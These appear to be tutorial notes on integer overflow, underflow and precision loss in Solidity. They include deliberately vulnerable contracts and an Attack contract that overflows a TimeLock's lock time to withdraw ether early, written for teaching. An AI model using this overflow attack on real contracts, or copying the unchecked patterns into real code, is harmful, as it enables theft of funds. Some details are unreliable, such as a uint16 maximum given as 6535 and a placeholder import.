In Solidity, integers types have maximum values.
**uint8 => 255 | uint16 => 6535 | uint256 => 2^256-1**
 
They can occur when you exceed the maximum value or when you go below them. When you exceed the maximum value, you go back to 0, and when you go below the minimum value, it brings you back to the maximum value.
 
Older contracts often made use of `SafeMath library`, to avoid over/underflows, but in Solidity >= v0.8.0 SafeMath logic is built in by default.
We use `unchecked{}` keyword in Solidity version 0.8.0 and above. If we don;t use it, the transaction will fail.

**Integer Overflow** occurs when a number is too big. The part that exceeds the maximum range is count from 0 again, sou you end up with a number that is smaller than you started with.

**Integer Underflow** - when a number is smaller thatn the minimum range it start count back from the maximum number and you end up with number that is greater than what you started with.

```php
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.8;

contract SafeMathTester{
	uint8 public bigNumber = 255;
	
	function add() public {
		bigNumber = bigNumber + 1; // after executing this function 255 will become 0, because it overflows the maximum number of uint8(255). In 0.6.0 version numbers are `unchecked`. if it's on 0.8.0 version or higher it will revert the transaction automatically.
	}
}
```
****
```php
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/*//////////////////////////////////////////////////////////////
                            OVERFLOW
//////////////////////////////////////////////////////////////*/

contract Overflow {
    uint8 public count;
    // uint8 has a max value of 255, so if we add 1 to 255, we get 0 if it's unchecked!
    // Versions prior to 0.8 of solidity also have this issue
    function increment(uint8 amount) public {
        unchecked {
            count = count + amount;
        }
    }
}

/*//////////////////////////////////////////////////////////////
                            UNDERFLOW
//////////////////////////////////////////////////////////////*/

contract Underflow {
    uint8 public count;
    // uint8 has a min value of 0, but if we subtract 1 from 0, we get 255 if it's unchecked
    // Versions prior to 0.8 of solidity also have this issue
    function decrement() public {
        unchecked {
            count--;
        }
    }
}

/*//////////////////////////////////////////////////////////////
                            PRECISION LOSS
//////////////////////////////////////////////////////////////*/

contract PrecisionLoss {
    uint256 public moneyToSplitUp = 225;
    uint256 public users = 4;
    // This function will return 56, but we want it to return 56.25
    function shareMoney() public view returns (uint256) {
        return moneyToSplitUp / users;
    }
}
```

**Mitigation:** Newer version of Solidity, usage of bigger `uints`.
> Use Math libraries, like OpenZeppelin's SafeMath
****
```php
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

// This contract is designed to act as a time vault.
// User can deposit into this contract but cannot withdraw for atleast a week.
// User can also extend the wait time beyond the 1 week waiting period.

/*
1. Deploy TimeLock
2. Deploy Attack with address of TimeLock
3. Call Attack.attack sending 1 ether. You will immediately be able to
   withdraw your ether.

What happened?
Attack caused the TimeLock.lockTime to overflow and was able to withdraw
before the 1 week waiting period, because of overflow.
*/
import "SafeMath link";

contract TimeLock {
	using SafeMath for uint; // it will add extra function to uint data type that take care of over/under flows.

    mapping(address => uint) public balances; // amount of ETH that you deposit
    mapping(address => uint) public lockTime; // time at which you can withdraw

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks; // update your balance and set 1 week period
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease; // increase period of 1 week
        /*lockTime[msg.sender] = lockTime[msg.sender].add(_secondsToIncrease) - add comes from SafeMath library, and if you add too much, it will warn you, that will be overflowed */ 
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");
        // check whether you deposit some ETH and if 1 week is expired or not
        // So, if you try to call this function before 1 week has passed since you deposited, you won't be able to withrdaw

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0; // withdraw

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) public {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable { } // store the withdrawn funds

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        timeLock.increaseLockTime(uint(-timeLock.lockTime(address(this)))); // overflow/ pass one week and withrdaw immediately
        timeLock.withdraw();
    }
}
```
****
### Insecure Arithmetic

```php
mapping (address => uint256) public balanceOf;

// INSECURE
function transfer(address _to, uint256 _value) {
    /* Check if sender has balance */
    require(balanceOf[msg.sender] >= _value);
    /* Add and subtract new balances */
    balanceOf[msg.sender] -= _value;
    balanceOf[_to] += _value;
}

// SECURE
function transfer(address _to, uint256 _value) {
    /* Check if sender has balance and for overflows */
    require(balanceOf[msg.sender] >= _value && balanceOf[_to] + _value >= balanceOf[_to]);

    /* Add and subtract new balances */
    balanceOf[msg.sender] -= _value;
    balanceOf[_to] += _value;
}
```

If a balance reaches the _maximum uint value (2^256)_ it will circle back to zero which checks for the condition. This may or may not be relevant, depending on the implementation. Think about whether or not the `uint` value has an opportunity to approach such a large number. Think about how the `uint` variable changes state, and who has authority to make such changes. If any user can call functions which update the `uint` value, it's more vulnerable to attack. If only an admin has access to change the variable's state, you might be safe. If a user can increment by only 1 at a time, you are probably also safe because there is no feasible way to reach this limit.